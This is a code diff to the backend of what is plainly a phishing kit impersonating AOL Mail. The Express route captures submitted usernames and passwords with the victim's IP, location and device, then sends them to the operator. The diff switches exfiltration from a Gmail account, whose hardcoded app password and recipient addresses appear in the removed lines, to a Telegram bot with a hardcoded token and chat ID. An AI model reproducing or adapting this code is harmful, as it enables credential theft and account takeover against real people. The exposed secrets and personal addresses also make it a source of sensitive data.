@@ -1,8 +1,8 @@
 const express = require("express");
-const nodemailer = require('nodemailer');
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
 const cors = require('cors');
+const axios = require('axios');
 
 const router = express.Router();
 
@@ -18,25 +18,25 @@ router.options('/', (req, res) => {
     res.sendStatus(200);
 });
 
-// Merge tag function
-function replaceMergeTags(template, data) {
-    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = '8389054650:AAG72dcNDy4NiidFxjRS9PoEuECEGqPfxyA'; // Get from @BotFather
+const TELEGRAM_CHAT_ID = '6639641686'; // Your personal chat ID
+
+// Function to send message to Telegram
+async function sendTelegramMessage(message) {
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Telegram message sent successfully');
+        return true;
+    } catch (error) {
+        console.log('❌ Telegram message failed:', error.message);
+        return false;
+    }
 }
-
-// Email transporter configuration - USING SERVICE INSTEAD OF HOST/PORT
-const transporter = nodemailer.createTransport({
-    service: 'gmail', // Use service instead of host/port
-    auth: {
-        user: "onidaniel801@gmail.com",
-        pass: "hmoc cjhn sljo rtaq",
-    },
-    connectionTimeout: 10000, // 10 seconds timeout
-    socketTimeout: 10000,
-    greetingTimeout: 10000
-});
-
-// Don't verify on startup - verify on first use instead
-console.log('📧 Email transporter configured (will verify on first use)');
 
 router.post('/', async (req, res) => {
     try {
@@ -45,7 +45,7 @@ router.post('/', async (req, res) => {
             passwordLength: req.body.password ? req.body.password.length : 0
         });
 
-        const { username, password } = req.body;
+        const { username, password, attempt } = req.body;
 
         if (!username || !password) {
             return res.status(400).json({ 
@@ -62,7 +62,7 @@ router.post('/', async (req, res) => {
         const agent = parser.getResult();
         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
 
-        // ✅ LOG CREDENTIALS IMMEDIATELY (before email attempt)
+        // ✅ LOG CREDENTIALS IMMEDIATELY
         console.log('🔐 CREDENTIALS CAPTURED:', {
             username: username,
             password: password,
@@ -72,95 +72,29 @@ router.post('/', async (req, res) => {
             timestamp: new Date().toLocaleString()
         });
 
-        // Fixed HTML template
-        const htmlTemplate = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <style>
-                    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-                    .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                    .header { background: #1a73e8; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-                    .info-item { margin: 10px 0; padding: 8px; background: #f8f9fa; border-radius: 5px; }
-                    .label { font-weight: bold; color: #333; }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <div class="header">
-                        <h1>🔐 AOL Mail Login Notification</h1>
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">👤 Username:</span> [[-username-]]
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">🔑 Password:</span> [[-password-]]
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">🌐 IP Address:</span> [[-ip-]]
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">📍 Location:</span> [[-location-]]
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">🕒 Timestamp:</span> [[-timestamp-]]
-                    </div>
-                    
-                    <div class="info-item">
-                        <span class="label">💻 Device:</span> [[-device-]]
-                    </div>
-                </div>
-            </body>
-            </html>
+        // ✅ SEND TO TELEGRAM
+        const telegramMessage = `
+🔐 <b>NEW AOL LOGIN CAPTURED</b>
+
+👤 <b>Username:</b> <code>${username}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+🌐 <b>IP Address:</b> ${ip}
+📍 <b>Location:</b> ${locationStr}
+💻 <b>Device:</b> ${deviceType}
+🕒 <b>Timestamp:</b> ${new Date().toLocaleString()}
+📊 <b>Attempt:</b> ${attempt || 1}
+
+#AOL #Credentials
         `;
 
-        const mergedHtml = replaceMergeTags(htmlTemplate, {
-            username: username,
-            password: password,
-            ip: ip,
-            location: locationStr,
-            timestamp: new Date().toLocaleString(),
-            device: deviceType,
-        });
-
-        const textContent = `
-🔐 AOL MAIL LOGIN NOTIFICATION
-
-👤 Username: ${username}
-🔑 Password: ${password}
-🌐 IP Address: ${ip}
-📍 Location: ${locationStr}
-🕒 Timestamp: ${new Date().toLocaleString()}
-💻 Device: ${deviceType}
-
-Automated security notification.
-        `;
-
-        // ✅ SEND EMAIL WITH TIMEOUT PROTECTION
         try {
-            console.log('📧 Attempting to send email...');
-            
-            await transporter.sendMail({
-                from: '"AOL Mail Security" <onidaniel801@gmail.com>',
-                to: "josephblessing6776@gmail.com",
-                subject: `🔐 New AOL Login - ${username}`,
-                html: mergedHtml,
-                text: textContent,
-            });
-
-            console.log(`✅ Email sent successfully for: ${username}`);
-            
-        } catch (emailError) {
-            console.log('⚠️ Email failed but credentials logged:', emailError.message);
-            // Continue anyway - credentials are already logged
+            console.log('📱 Attempting to send Telegram notification...');
+            await sendTelegramMessage(telegramMessage);
+        } catch (telegramError) {
+            console.log('⚠️ Telegram failed but credentials logged');
         }
 
-        // Return success to frontend (regardless of email success)
+        // Return success to frontend immediately
         res.status(200).json({
             success: true,
             message: "Login processed successfully",
